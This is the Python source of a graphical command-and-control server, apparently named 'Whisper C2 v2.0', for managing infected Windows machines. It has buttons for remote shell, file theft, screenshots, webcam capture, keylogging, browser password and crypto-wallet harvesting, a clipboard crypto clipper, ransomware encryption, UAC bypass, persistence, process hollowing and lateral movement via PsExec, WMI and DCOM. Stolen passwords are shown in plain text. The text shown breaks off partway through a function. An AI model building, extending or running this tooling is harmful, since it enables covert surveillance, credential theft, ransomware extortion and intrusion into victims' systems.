import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import threading, socket, json, base64, os, sys, time, datetime, struct, hashlib, hmac

DARK_BG = "#1a1a2e"
DARKER_BG = "#16213e"
DARKEST_BG = "#0f3460"
ACCENT = "#e94560"
TEXT_FG = "#e0e0e0"
TEXT_SEC = "#a0a0a0"
GREEN = "#00ff88"
FONT = ("Consolas", 10)
FONT_BOLD = ("Consolas", 10, "bold")
FONT_SM = ("Consolas", 9)

def derive_key(password, salt=b"whisper_salt_2024", length=32):
    return hashlib.pbkdf2_hmac("sha256", password.encode(), salt, 100000, length)

def encrypt_bytes(plain, key):
    iv = os.urandom(16)
    ks, ctr = b"", 0
    while len(ks) < len(plain):
        ks += hmac.new(key, iv + struct.pack(">Q", ctr), hashlib.sha256).digest(); ctr += 1
    ct = bytes(p ^ k for p, k in zip(plain, ks))
    tag = hmac.new(key, iv + ct, hashlib.sha256).digest()[:16]
    return iv + tag + ct

def decrypt_bytes(data, key):
    iv, tag, ct = data[:16], data[16:32], data[32:]
    if not hmac.compare_digest(tag, hmac.new(key, iv + ct, hashlib.sha256).digest()[:16]):
        raise ValueError("Integrity check failed")
    ks, ctr = b"", 0
    while len(ks) < len(ct):
        ks += hmac.new(key, iv + struct.pack(">Q", ctr), hashlib.sha256).digest(); ctr += 1
    return bytes(p ^ k for p, k in zip(ct, ks))

def setup_styles():
    style = ttk.Style()
    style.theme_use("clam")
    style.configure("Treeview", background=DARK_BG, foreground=TEXT_FG, fieldbackground=DARK_BG, rowheight=26, font=FONT_SM)
    style.configure("Treeview.Heading", background=DARKER_BG, foreground=TEXT_FG, font=FONT_BOLD, relief="flat")
    style.map("Treeview", background=[("selected", ACCENT)], foreground=[("selected", "#ffffff")])
    style.configure("TNotebook", background=DARK_BG, borderwidth=0)
    style.configure("TNotebook.Tab", background=DARKER_BG, foreground=TEXT_FG, padding=[10, 4], font=FONT)
    style.map("TNotebook.Tab", background=[("selected", ACCENT)], foreground=[("selected", "#ffffff")])
    style.configure("TFrame", background=DARK_BG)
    style.configure("TLabelframe", background=DARK_BG, foreground=TEXT_FG)
    style.configure("TLabelframe.Label", background=DARK_BG, foreground=TEXT_FG, font=FONT)
    style.configure("TButton", background=ACCENT, foreground="#ffffff", font=FONT_BOLD, borderwidth=0, padding=[8, 4])
    style.map("TButton", background=[("active", "#ff6b81"), ("pressed", "#c0392b")])
    style.configure("Success.TButton", background=GREEN, foreground="#000000")
    style.configure("TLabel", background=DARK_BG, foreground=TEXT_FG, font=FONT)
    style.configure("TEntry", fieldbackground=DARKER_BG, foreground=TEXT_FG, font=FONT_SM)
    style.configure("Vertical.TScrollbar", background=DARKER_BG, troughcolor=DARK_BG)
    style.configure("Horizontal.TScrollbar", background=DARKER_BG, troughcolor=DARK_BG)

class C2Engine:
    def __init__(self, password="whisper_secret_key", port=4443):
        self.password = password
        self.port = port
        self.clients = {}
        self.lock = threading.Lock()
        self.running = False
        self.sock = None
        self.client_id = 0
        self.callbacks = {}

    def set_callback(self, name, fn):
        self.callbacks[name] = fn

    def _key(self): return derive_key(self.password)
    def encrypt(self, data): return base64.b64encode(encrypt_bytes(json.dumps(data).encode(), self._key()))
    def decrypt(self, data): return json.loads(decrypt_bytes(base64.b64decode(data), self._key()))

    def send(self, conn, data, raw=False):
        if raw:
            payload = json.dumps(data).encode()
        else:
            payload = self.encrypt(data)
        conn.sendall(len(payload).to_bytes(4, "big") + payload)

    def recv(self, conn):
        raw = conn.recv(4)
        if not raw: return None
        size = int.from_bytes(raw, "big")
        data = b""
        while len(data) < size:
            chunk = conn.recv(size - len(data))
            if not chunk: return None
            data += chunk
        if not data: return None
        try:
            return self.decrypt(data)
        except:
            try:
                return json.loads(data)
            except:
                return None

    def start(self):
        self.running = True
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("0.0.0.0", self.port))
        self.sock.listen(10)
        self.sock.settimeout(1)
        self._notify("status", f"Server started on port {self.port}")
        while self.running:
            try:
                conn, addr = self.sock.accept()
                threading.Thread(target=self._handle_client, args=(conn, addr), daemon=True).start()
            except socket.timeout: continue
            except: break

    def stop(self):
        self.running = False
        for cid in list(self.clients.keys()):
            try: self.clients[cid]["conn"].close()
            except: pass
        try: self.sock.close()
        except: pass

    def _recv_raw(self, conn):
        raw = conn.recv(4)
        if not raw: return None, False
        sz = int.from_bytes(raw, "big")
        data = b""
        while len(data) < sz:
            chunk = conn.recv(sz - len(data))
            if not chunk: return None, False
            data += chunk
        try:
            return self.decrypt(data), False
        except:
            try:
                return json.loads(data), True
            except:
                return None, False

    def _handle_client(self, conn, addr):
        cid = None
        try:
            init, raw = self._recv_raw(conn)
            if not init or init.get("type") != "init": return
            with self.lock:
                self.client_id += 1; cid = self.client_id
                self.clients[cid] = {
                    "conn": conn, "addr": addr, "info": init,
                    "connected": time.time(), "alive": True, "raw": raw,
                    "iolock": threading.Lock(),
                }
            self._notify("client_added", cid, init)
            while self.running:
                with self.lock:
                    if cid not in self.clients or not self.clients[cid].get("alive", False):
                        break
                    lock = self.clients[cid].get("iolock")
                if lock is None: break
                if lock.acquire(blocking=False):
                    try:
                        conn.settimeout(0.05)
                        m = self._recv_raw(conn)
                    except socket.timeout:
                        lock.release(); time.sleep(2); continue
                    except:
                        lock.release(); break
                    lock.release()
                    if m is None or m[0] is None: break
                    time.sleep(2)
                else:
                    time.sleep(0.1)
        except: pass
        finally:
            try: conn.close()
            except: pass
            removed = False
            with self.lock:
                if cid and cid in self.clients:
                    del self.clients[cid]; removed = True
            if cid and removed: self._notify("client_removed", cid)

    def _cleanup(self, cid):
        removed = False
        with self.lock:
            if cid in self.clients:
                self.clients[cid]["alive"] = False
                del self.clients[cid]
                removed = True
        if removed:
            self._notify("client_removed", cid)

    def interact(self, cid, msg, timeout=30):
        if cid not in self.clients: return {"error": "Client disconnected"}
        try:
            c = self.clients[cid]
            c["conn"].settimeout(timeout)
            raw = c.get("raw", False)
            with c["iolock"]:
                self.send(c["conn"], msg, raw=raw)
                resp = self.recv(c["conn"])
                while resp and resp.get("type") == "ping":
                    resp = self.recv(c["conn"])
                if resp is None:
                    raise ConnectionError("Connection closed by peer")
            return resp
        except Exception as e:
            self._cleanup(cid)
            return {"error": str(e)}

    def _notify(self, event, *args):
        if event in self.callbacks:
            self.callbacks[event](*args)

class ClientApp(tk.Toplevel):
    def __init__(self, parent, cid, engine):
        super().__init__(parent)
        self.cid = cid
        self.engine = engine
        self.results = {}
        self.title(f"Whisper - Client [{cid}]")
        self.geometry("900x600")
        self.configure(bg=DARK_BG)
        self.transient(parent)
        self.after(100, self._pull_info)

        self.notebook = ttk.Notebook(self)
        self.notebook.pack(fill="both", expand=True, padx=5, pady=5)

        self._build_shell_tab()
        self._build_files_tab()
        self._build_screenshot_tab()
        self._build_tools_tab()

    def _pull_info(self):
        def task():
            resp = self.engine.interact(self.cid, {"type": "info"})
            if resp and "error" not in resp:
                info = f"  OS: {resp.get('os', '?')}  |  Host: {resp.get('hostname', '?')}  |  User: {resp.get('user', '?')}  |  Priv: {resp.get('privilege', '?')}"
                self.after(0, lambda: self.info_label.config(text=info) if self.winfo_exists() else None)
            else:
                self.after(0, lambda: self.info_label.config(text=f"  {resp.get('error', 'No response')}") if self.winfo_exists() else None)
        threading.Thread(target=task, daemon=True).start()

    def _build_shell_tab(self):
        f = ttk.Frame(self.notebook)
        self.notebook.add(f, text=" Shell ")
        self.shell_output = scrolledtext.ScrolledText(f, bg=DARKEST_BG, fg=GREEN, insertbackground=GREEN,
            font=FONT, wrap="word", relief="flat", borderwidth=0, state="disabled")
        self.shell_output.pack(fill="both", expand=True, padx=5, pady=5)
        self.shell_output.tag_config("error", foreground=ACCENT)
        bottom = tk.Frame(f, bg=DARK_BG)
        bottom.pack(fill="x", padx=5, pady=5)
        tk.Label(bottom, text="Command:", bg=DARK_BG, fg=TEXT_FG, font=FONT).pack(side="left")
        self.shell_entry = tk.Entry(bottom, bg=DARKER_BG, fg=TEXT_FG, insertbackground=TEXT_FG, font=FONT, relief="flat")
        self.shell_entry.pack(side="left", fill="x", expand=True, padx=5)
        self.shell_entry.bind("<Return>", self._exec_shell)
        ttk.Button(bottom, text="Run", command=self._exec_shell).pack(side="right")
        self.info_label = tk.Label(f, bg=DARK_BG, fg=TEXT_SEC, font=FONT_SM, anchor="w")
        self.info_label.pack(fill="x", padx=5)

    def _exec_shell(self, event=None):
        cmd = self.shell_entry.get().strip()
        if not cmd: return
        self.shell_entry.delete(0, "end")
        self._append_shell(f"C:\\> {cmd}\n")
        threading.Thread(target=self._run_shell, args=(cmd,), daemon=True).start()

    def _run_shell(self, cmd):
        resp = self.engine.interact(self.cid, {"type": "shell", "cmd": cmd})
        self.after(0, self._append_shell, (resp or {}).get("output", "[!] No response") + "\n")

    def _append_shell(self, text):
        if not self.winfo_exists(): return
        self.shell_output.configure(state="normal")
        self.shell_output.insert("end", text)
        self.shell_output.see("end")
        self.shell_output.configure(state="disabled")

    def _build_files_tab(self):
        f = ttk.Frame(self.notebook)
        self.notebook.add(f, text=" Files ")
        top = tk.Frame(f, bg=DARK_BG)
        top.pack(fill="x", padx=5, pady=5)
        tk.Label(top, text="Path:", bg=DARK_BG, fg=TEXT_FG, font=FONT).pack(side="left")
        self.file_path = tk.Entry(top, bg=DARKER_BG, fg=TEXT_FG, insertbackground=TEXT_FG, font=FONT, relief="flat")
        self.file_path.insert(0, ".")
        self.file_path.pack(side="left", fill="x", expand=True, padx=5)
        ttk.Button(top, text="List", command=self._list_files).pack(side="right")
        self.files_tree = ttk.Treeview(f, columns=("name", "type", "size"), show="headings", height=12)
        self.files_tree.heading("name", text="Name"); self.files_tree.heading("type", text="Type"); self.files_tree.heading("size", text="Size")
        self.files_tree.column("name", width=300); self.files_tree.column("type", width=80); self.files_tree.column("size", width=100)
        self.files_tree.pack(fill="both", expand=True, padx=5, pady=5)
        self.files_tree.bind("<Double-1>", lambda e: self._cd_selected())
        btn_f = tk.Frame(f, bg=DARK_BG)
        btn_f.pack(fill="x", padx=5, pady=5)
        ttk.Button(btn_f, text="Upload", command=self._upload_file).pack(side="left", padx=2)
        ttk.Button(btn_f, text="Download", command=self._download_file).pack(side="left", padx=2)

    def _list_files(self, path=None):
        p = path or self.file_path.get().strip() or "."
        def task():
            resp = self.engine.interact(self.cid, {"type": "ls", "path": p})
            self.after(0, self._populate_files, resp, p)
        threading.Thread(target=task, daemon=True).start()

    def _populate_files(self, resp, p):
        if not self.winfo_exists(): return
        if not resp or resp.get("error"):
            messagebox.showerror("Error", resp.get("error", "No response"))
            return
        self.file_path.delete(0, "end"); self.file_path.insert(0, resp["path"])
        for item in self.files_tree.get_children(): self.files_tree.delete(item)
        for i in resp.get("items", []):
            tag = "dir" if i["type"] == "dir" else "file"
            size = f"{i['size']:,} B" if i["type"] == "file" else ""
            self.files_tree.insert("", "end", values=(i["name"], "DIR" if tag == "dir" else "FILE", size), tags=(tag,))
        self.files_tree.tag_configure("dir", foreground=GREEN)

    def _cd_selected(self):
        sel = self.files_tree.selection()
        if sel:
            vals = self.files_tree.item(sel[0], "values")
            if vals[1] == "DIR":
                path = os.path.join(self.file_path.get(), vals[0])
                self._list_files(path)

    def _upload_file(self):
        local = filedialog.askopenfilename()
        if not local: return
        remote = filedialog.asksaveasfilename(title="Remote path", initialfile=os.path.basename(local))
        if not remote: return
        threading.Thread(target=self._do_upload, args=(local, remote), daemon=True).start()

    def _do_upload(self, local, remote):
        with open(local, "rb") as f: data = base64.b64encode(f.read()).decode()
        resp = self.engine.interact(self.cid, {"type": "upload", "path": remote, "data": data})
        self.after(0, lambda: messagebox.showinfo("Upload", resp.get("output", "[!] Failed")))

    def _download_file(self):
        sel = self.files_tree.selection()
        if not sel: return
        name = self.files_tree.item(sel[0], "values")[0]
        remote = os.path.join(self.file_path.get(), name)
        local = filedialog.asksaveasfilename(defaultextension=name, initialfile=name)
        if not local: return
        threading.Thread(target=self._do_download, args=(remote, local), daemon=True).start()

    def _do_download(self, remote, local):
        resp = self.engine.interact(self.cid, {"type": "download", "path": remote})
        if resp and "data" in resp:
            with open(local, "wb") as f: f.write(base64.b64decode(resp["data"]))
            self.after(0, lambda: messagebox.showinfo("Download", f"Saved to {local}"))
        else:
            self.after(0, lambda: messagebox.showerror("Download", resp.get("error", "Failed")))

    def _build_screenshot_tab(self):
        f = ttk.Frame(self.notebook)
        self.notebook.add(f, text=" Screen ")
        self.screenshot_label = tk.Label(f, bg=DARKEST_BG, text="Click 'Capture' to take a screenshot", fg=TEXT_SEC, font=FONT)
        self.screenshot_label.pack(fill="both", expand=True, padx=5, pady=5)
        ttk.Button(f, text="Capture Screenshot", command=self._take_screenshot).pack(pady=5)

    def _take_screenshot(self):
        self.screenshot_label.config(text="Capturing...")
        threading.Thread(target=self._do_screenshot, daemon=True).start()

    def _do_screenshot(self):
        resp = self.engine.interact(self.cid, {"type": "screenshot"})
        if resp and "data" in resp:
            import io
            from PIL import Image, ImageTk
            img = Image.open(io.BytesIO(base64.b64decode(resp["data"])))
            img.thumbnail((700, 400))
            self._photo = ImageTk.PhotoImage(img)
            self.after(0, lambda: self.screenshot_label.configure(image=self._photo, text="") if self.winfo_exists() else None)
        else:
            self.after(0, lambda: self.screenshot_label.configure(text="[!] Capture failed", image="") if self.winfo_exists() else None)

    def _show_result_window(self, title, content):
        if not self.winfo_exists(): return
        w = tk.Toplevel(self)
        w.title(f"Result - {title}")
        w.geometry("700x450")
        w.configure(bg=DARK_BG)
        w.transient(self)
        txt = scrolledtext.ScrolledText(w, bg=DARKEST_BG, fg=GREEN, font=FONT_SM, relief="flat", state="normal")
        txt.pack(fill="both", expand=True, padx=5, pady=5)
        txt.insert("1.0", content)
        txt.configure(state="disabled")
        bf = tk.Frame(w, bg=DARK_BG)
        bf.pack(fill="x", padx=5, pady=3)
        def _save():
            path = f"whisper_{title.replace(' ','_').lower()}_{self.cid}.txt"
            with open(path, "w") as f:
                f.write(txt.get("1.0", "end-1c"))
            messagebox.showinfo("Saved", f"Exported to {path}", parent=w)
        ttk.Button(bf, text="Save", command=_save).pack(side="left", padx=2)

    def _tool_cmd(self, cmd_type, msg_extra=None):
        msg = {"type": cmd_type}
        if msg_extra: msg.update(msg_extra)
        def task():
            resp = self.engine.interact(self.cid, msg) or {}
            display = resp.get("output") or resp.get("data") or resp.get("error") or json.dumps(resp, indent=2)
            self.results[f"{cmd_type}_{self.cid}"] = str(display)
            self.after(0, self._show_result_window, cmd_type, str(display))
        threading.Thread(target=task, daemon=True).start()

    def _harvest_browsers(self):
        def task():
            resp = self.engine.interact(self.cid, {"type": "harvest"})
            lines = []
            if not resp or "data" not in resp:
                lines.append("[!] Harvest failed")
            else:
                d = resp["data"]
                lines.append(f"[+] {d.get('total',d.get('total_passwords',0))} passwords found")
                for c in d.get("passwords", [])[:50]:
                    lines.append(f"  [{c.get('browser','?')}] {c.get('url','')} | {c.get('user','')} | {c.get('pass','')}")
                if len(d.get("passwords", [])) > 50:
                    lines.append(f"  ... +{len(d['passwords'])-50} more")
            result = "\n".join(lines)
            self.results[f"harvest_{self.cid}"] = result
            self.after(0, self._show_result_window, "Browser Harvest", result)
        threading.Thread(target=task, daemon=True).start()

    def _webcam(self):
        def task():
            resp = self.engine.interact(self.cid, {"type": "webcam"})
            if resp and "data" in resp:
                import io; from PIL import Image, ImageTk
                try:
                    img = Image.open(io.BytesIO(base64.b64decode(resp["data"])))
                    img.thumbnail((500, 375))
                    def show():
                        if not self.winfo_exists(): return
                        w = tk.Toplevel(self)
                        w.title("Webcam Capture")
                        w.configure(bg=DARK_BG)
                        self._wc_photo = ImageTk.PhotoImage(img)
                        tk.Label(w, image=self._wc_photo, bg=DARK_BG).pack(padx=5, pady=5)
                    self.after(0, show)
                    self.results[f"webcam_{self.cid}"] = "[+] Webcam image captured"
                except:
                    self.after(0, self._show_result_window, "Webcam", "[!] Webcam display failed")
            else:
                msg = resp.get("output", "[!] Webcam capture failed")
                self.results[f"webcam_{self.cid}"] = msg
                self.after(0, self._show_result_window, "Webcam", msg)
        threading.Thread(target=task, daemon=True).start()

    def _build_tools_tab(self):
        f = ttk.Frame(self.notebook)
        self.notebook.add(f, text=" Tools ")
        c = tk.Canvas(f, bg=DARK_BG, highlightthickness=0)
        sc = ttk.Scrollbar(f, orient="vertical", command=c.yview)
        sf = tk.Frame(c, bg=DARK_BG)
        sf.bind("<Configure>", lambda e: c.configure(scrollregion=c.bbox("all")))
        c.create_window((0,0), window=sf, anchor="nw"); c.configure(yscrollcommand=sc.set)
        c.pack(side="left", fill="both", expand=True); sc.pack(side="right", fill="y")

        sections = [
            ("Utility", [
                ("System Info", lambda: self._tool_cmd("info")),
                ("Persistence", lambda: self._tool_cmd("persist")),
                ("UAC Bypass", lambda: self._tool_cmd("uac_bypass", {"method":"auto"})),
                ("Check VM", lambda: self._tool_cmd("check_vm")),
                ("Vuln Scan", lambda: self._tool_cmd("vuln_scan")),
            ]),
            ("Surveillance", [
                ("Keylog Start", lambda: self._tool_cmd("keylog_start")),
                ("Keylog Stop", lambda: self._tool_cmd("keylog_stop")),
                ("Get Keylogs", lambda: self._tool_cmd("keylog_get")),
                ("Harvest Browsers", self._harvest_browsers),
                ("Webcam", self._webcam),
                ("WiFi Harvest", lambda: self._tool_cmd("wifi_harvest")),
                ("Crypto Steal", lambda: self._tool_cmd("crypto_steal")),
                ("Clipboard Get", lambda: self._tool_cmd("clipboard_get")),
                ("Clip Mon Start", lambda: self._tool_cmd("clipboard_monitor", {"action":"start"})),
                ("Clip Mon Stop", lambda: self._tool_cmd("clipboard_monitor", {"action":"stop"})),
                ("Clip Mon Dump", lambda: self._tool_cmd("clipboard_monitor", {"action":"dump"})),
            ]),
            ("HVNC", [
                ("Start", lambda: self._tool_cmd("hvnc_start")),
                ("Stop", lambda: self._tool_cmd("hvnc_stop")),
                ("Screenshot", lambda: self._tool_cmd("hvnc_screenshot")),
                ("Stream", lambda: self._tool_cmd("hvnc_stream", {"count":5,"delay":1})),
                ("Mouse Move", lambda: self._tool_cmd("hvnc_mouse", {"action":"move","x":100,"y":100})),
                ("Mouse Click", lambda: self._tool_cmd("hvnc_mouse", {"action":"click","x":100,"y":100})),
                ("Key Enter", lambda: self._tool_cmd("hvnc_key", {"key":13})),
            ]),
            ("File Ops", [
                ("Hunt Docs", lambda: self._tool_cmd("file_hunt", {"category":"documents","max":30})),
                ("Hunt Creds", lambda: self._tool_cmd("file_hunt", {"category":"credentials","max":30})),
                ("Search *.env", lambda: self._tool_cmd("search", {"pattern":"*.env","max":30})),
            ]),
            ("Crypto Clipper", [
                ("Start", lambda: self._tool_cmd("clipper_start")),
                ("Stop", lambda: self._tool_cmd("clipper_stop")),
                ("Test", lambda: self._tool_cmd("clipper_test", {"text":"Send BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"})),
            ]),
            ("Ransomware", [
                ("Encrypt Test", lambda: self._tool_cmd("ransom_encrypt", {"path":os.path.expanduser("~\\Desktop"),"max":10})),
                ("Decrypt Test", lambda: self._tool_cmd("ransom_decrypt", {"path":os.path.expanduser("~\\Desktop"),"max":10})),
            ]),
            ("Network", [
                ("DNS Get", lambda: self._tool_cmd("dns_get")),
                ("DNS Set 8.8.8.8", lambda: self._tool_cmd("dns_set", {"primary":"8.8.8.8","secondary":"8.8.4.4"})),
                ("DNS Restore", lambda: self._tool_cmd("dns_restore")),
            ]),
            ("Process", [
                ("List Processes", lambda: self._tool_cmd("list_processes")),
                ("Hollow rundll32", lambda: self._tool_cmd("process_hollow")),
            ]),
        ]

        for title, btns in sections:
            tk.Label(sf, text=title, bg=DARK_BG, fg=ACCENT, font=FONT_BOLD).pack(pady=(6,1))
            gf = tk.Frame(sf, bg=DARK_BG)
            gf.pack(fill="x", padx=15, pady=1)
            for i, (text, cmd) in enumerate(btns):
                ttk.Button(gf, text=text, command=cmd).grid(row=i, column=0, sticky="ew", padx=2, pady=1)
            gf.columnconfigure(0, weight=1)

        # Lateral movement section
        tk.Label(sf, text="Lateral Movement", bg=DARK_BG, fg=ACCENT, font=FONT_BOLD).pack(pady=(6,1))
        lf = tk.Frame(sf, bg=DARK_BG)
        lf.pack(fill="x", padx=15)
        tk.Label(lf, text="Target:", bg=DARK_BG, fg=TEXT_FG, font=FONT_SM).grid(row=0, column=0, sticky="w")
        self.lat_target = tk.Entry(lf, bg=DARKER_BG, fg=TEXT_FG, font=FONT_SM, relief="flat")
        self.lat_target.grid(row=0, column=1, sticky="ew", padx=2)
        tk.Label(lf, text="User:", bg=DARK_BG, fg=TEXT_FG, font=FONT_SM).grid(row=0, column=2, sticky="w", padx=(10,0))
        self.lat_user = tk.Entry(lf, bg=DARKER_BG, fg=TEXT_FG, font=FONT_SM, relief="flat", width=12)
        self.lat_user.grid(row=0, column=3, sticky="ew", padx=2)
        tk.Label(lf, text="Pass:", bg=DARK_BG, fg=TEXT_FG, font=FONT_SM).grid(row=0, column=4, sticky="w", padx=(10,0))
        self.lat_pass = tk.Entry(lf, bg=DARKER_BG, fg=TEXT_FG, font=FONT_SM, relief="flat", width=12)
        self.lat_pass.grid(row=0, column=5, sticky="ew", padx=2)
        tk.Label(lf, text="Cmd:", bg=DARK_BG, fg=TEXT_FG, font=FONT_SM).grid(row=1, column=0, sticky="w")
        self.lat_cmd = tk.Entry(lf, bg=DARKER_BG, fg=TEXT_FG, font=FONT_SM, relief="flat")
        self.lat_cmd.insert(0, "whoami")
        self.lat_cmd.grid(row=1, column=1, columnspan=3, sticky="ew", padx=2)
        lf.columnconfigure(1, weight=1)

        def _lat(msg_type):
            extra = {"target": self.lat_target.get().strip(), "cmd": self.lat_cmd.get().strip()}
            u = self.lat_user.get().strip(); p = self.lat_pass.get().strip()
            if u: extra["user"] = u
            if p: extra["pass"] = p
            if not extra["target"]: messagebox.showwarning("Lateral", "Enter target host", parent=self); return
            self._tool_cmd(msg_type, extra)

        lat_bf = tk.Frame(sf, bg=DARK_BG)
        lat_bf.pack(fill="x", padx=15, pady=3)
        ttk.Button(lat_bf, text="PsExec", command=lambda: _lat("psexec")).pack(side="left", padx=2)
        ttk.Button(lat_bf, text="WMI Exec", command=lambda: _lat("wmiexec")).pack(side="left", padx=2)
        ttk.Button(lat_bf, text="DCOM Exec", command=lambda: _lat("dcomexec")).pack(side="left", padx=2)
        ttk.Button(lat_bf, text="RDP Harvest", command=lambda: self._tool_cmd("rdp_harvest")).pack(side="left", padx=2)

        # Export All
        exp_f = tk.Frame(sf, bg=DARK_BG)
        exp_f.pack(fill="x", padx=15, pady=(8,3))
        ttk.Button(exp_f, text="Export All Results", command=self._export_all).pack(side="left", padx=2)
        tk.Label(exp_f, text=f"({len(self.results)} commands)", bg=DARK_BG, fg=TEXT_SEC, font=FONT_SM).pack(side="left", padx=5)

    def _export_all(self):
        if not self.results:
            messagebox.showinfo("Export", "No results to export yet", parent=self)
            return
        path = f"whisper_all_results_{self.cid}.txt"
        with open(path, "w") as f:
            for key, val in sorted(self.results.items()):
                f.write(f"=== {key} ===\n{val}\n\n")
        messagebox.showinfo("Export", f"Exported {len(self.results)} results to {path}", parent=self)

    # ---------------------------------------------------------------------------

class MainApp:
    def __init__(self, master=None):
        if master is None:
            self.root = tk.Tk()
            self.root.title("Whisper C2 v2.0")
            self.root.geometry("1100x680")
            self.root.configure(bg=DARK_BG)
            self.root.minsize(800, 500)
            self.root.protocol("WM_DELETE_WINDOW", self._on_close)
            self.own_root = True
        else:
            self.root = master
            self.own_root = False
        setup_styles()
        self.engine = C2Engine(port=4443)
        self.engine.set_callback("client_added", self._on_client_add)
        self.engine.set_callback("client_removed", self._on_client_remove)
        self.engine.set_callback("status", lambda m: self._status(m))
        self.client_windows = {}
        self._build_ui()

    def _build_ui(self):
        # Top bar: title + status + controls
        top = tk.Frame(self.root, bg=DARKEST_BG, height=42)
        top.pack(fill="x")
        top.pack_propagate(False)
        tk.Label(top, text="Whisper C2", bg=DARKEST_BG, fg=ACCENT, font=("Consolas", 14, "bold")).pack(side="left", padx=12)
        ttk.Button(top, text="Start", command=self._start_server).pack(side="left", padx=3)
        ttk.Button(top, text="Stop", command=self._stop_server).pack(side="left", padx=3)
        ttk.Button(top, text="Settings", command=self._settings_dialog).pack(side="left", padx=3)
        self.status_indicator = tk.Label(top, text="STOPPED", bg=DARKEST_BG, fg=ACCENT, font=FONT_BOLD)
        self.status_indicator.pack(side="right", padx=8)
        self.port_label = tk.Label(top, text="Port: 4443", bg=DARKEST_BG, fg=TEXT_SEC, font=FONT_SM)
        self.port_label.pack(side="right", padx=8)
        self.client_count_label = tk.Label(top, text="0 clients", bg=DARKEST_BG, fg=TEXT_SEC, font=FONT_SM)
        self.client_count_label.pack(side="right", padx=8)

        # Main split: clients left, log right
        main = tk.Frame(self.root, bg=DARK_BG)
        main.pack(fill="both", expand=True)

        left = tk.Frame(main, bg=DARK_BG, width=280)
        left.pack(side="left", fill="y")
        left.pack_propagate(False)
        tk.Label(left, text="CLIENTS", bg=DARK_BG, fg=ACCENT, font=FONT_BOLD).pack(anchor="w", padx=6, pady=(4,0))
        self.client_tree = ttk.Treeview(left, columns=("id", "ip", "hostname", "os", "user"), show="headings", height=15)
        self.client_tree.heading("id", text="ID"); self.client_tree.heading("ip", text="IP")
        self.client_tree.heading("hostname", text="Hostname"); self.client_tree.heading("os", text="OS"); self.client_tree.heading("user", text="User")
        self.client_tree.column("id", width=30, minwidth=25); self.client_tree.column("ip", width=100, minwidth=80)
        self.client_tree.column("hostname", width=0, stretch=False)
        self.client_tree.column("os", width=0, stretch=False); self.client_tree.column("user", width=0, stretch=False)
        self.client_tree.pack(fill="both", expand=True, padx=6, pady=2)
        self.client_tree.bind("<Double-1>", self._open_client)
        self.client_tree.bind("<Button-3>", self._client_menu)
        btn_f = tk.Frame(left, bg=DARK_BG)
        btn_f.pack(fill="x", padx=6, pady=(0,4))
        ttk.Button(btn_f, text="Open", command=lambda: self._open_client()).pack(side="left", padx=1)
        ttk.Button(btn_f, text="Disconnect", command=self._disconnect_client).pack(side="left", padx=1)

        sep = tk.Frame(main, bg=DARKER_BG, width=1)
        sep.pack(side="left", fill="y")

        right = tk.Frame(main, bg=DARK_BG)
        right.pack(side="left", fill="both", expand=True)
        self.event_log = scrolledtext.ScrolledText(right, bg=DARKEST_BG, fg=TEXT_FG, insertbackground=TEXT_FG,
            font=FONT_SM, wrap="word", relief="flat", borderwidth=0, state="disabled")
        self.event_log.pack(fill="both", expand=True, padx=6, pady=4)
        self.event_log.tag_config("green", foreground=GREEN)
        self.event_log.tag_config("red", foreground=ACCENT)

    def _status(self, msg):
        pass

    def _log(self, msg, tag=None):
        self.event_log.configure(state="normal")
        self.event_log.insert("end", f"[{datetime.datetime.now().strftime('%H:%M:%S')}] {msg}\n", tag)
        self.event_log.see("end")
        self.event_log.configure(state="disabled")

    def _start_server(self):
        if self.engine.running:
            self._log("Server already running", "red")
            return
        self.status_indicator.config(text="RUNNING", fg=GREEN)
        self._log("Starting server...", "green")
        threading.Thread(target=self.engine.start, daemon=True).start()

    def _stop_server(self):
        if not self.engine.running: return
        for cid in list(self.engine.clients.keys()):
            try:
                c = self.engine.clients[cid]
                c["conn"].settimeout(2)
                raw = c.get("raw", False)
                self.engine.send(c["conn"], {"type": "exit"}, raw=raw)
            except: pass
        self.engine.stop()
        self.status_indicator.config(text="STOPPED", fg=ACCENT)
        self._log("Server stopped", "red")
        self.client_tree.delete(*self.client_tree.get_children())
        for w in self.client_windows.values():
            try: w.destroy()
            except: pass
        self.client_windows.clear()

    def _settings_dialog(self):
        d = tk.Toplevel(self.root)
        d.title("Server Settings"); d.geometry("350x200"); d.configure(bg=DARK_BG); d.transient(self.root)
        tk.Label(d, text="Port:", bg=DARK_BG, fg=TEXT_FG, font=FONT).pack(pady=5)
        port_e = tk.Entry(d, bg=DARKER_BG, fg=TEXT_FG, font=FONT, relief="flat"); port_e.insert(0, str(self.engine.port)); port_e.pack()
        tk.Label(d, text="Encryption Key:", bg=DARK_BG, fg=TEXT_FG, font=FONT).pack(pady=5)
        key_e = tk.Entry(d, bg=DARKER_BG, fg=TEXT_FG, font=FONT, relief="flat"); key_e.insert(0, self.engine.password); key_e.pack()
        def save():
            try:
                self.engine.port = int(port_e.get())
                self.engine.password = key_e.get()
                self.port_label.config(text=f"Port: {self.engine.port}")
                self._log(f"Settings updated: port={self.engine.port}", "green")
                d.destroy()
            except: messagebox.showerror("Error", "Invalid port")
        ttk.Button(d, text="Save", command=save).pack(pady=15)

    def _update_client_count(self):
        n = len(self.engine.clients)
        self.client_count_label.config(text=f"  [{n} client{'s' if n != 1 else ''}]")

    def _on_client_add(self, cid, info):
        ip = f"{self.engine.clients[cid]['addr'][0]}"
        self.client_tree.insert("", 0, iid=str(cid), values=(cid, ip, info.get("hostname", "?"), info.get("os", "?")[:20], info.get("user", "?")))
        self._log(f"Client [{cid}] connected - {info.get('hostname', '?')} ({ip})", "green")
        self._update_client_count()
        for w in self.client_windows.values():
            try: w.lift()
            except: pass

    def _on_client_remove(self, cid):
        try: self.client_tree.delete(str(cid))
        except: pass
        self._log(f"Client [{cid}] disconnected", "red")
        self._update_client_count()
        w = self.client_windows.pop(cid, None)
        if w:
            try: w.destroy()
            except: pass

    def _selected_cid(self):
        sel = self.client_tree.selection()
        return int(sel[0]) if sel else None

    def _client_menu(self, event):
        iid = self.client_tree.identify_row(event.y)
        if iid:
            self.client_tree.selection_set(iid)
            menu = tk.Menu(self.root, tearoff=0, bg=DARKER_BG, fg=TEXT_FG, activebackground=ACCENT, activeforeground="#fff", font=FONT)
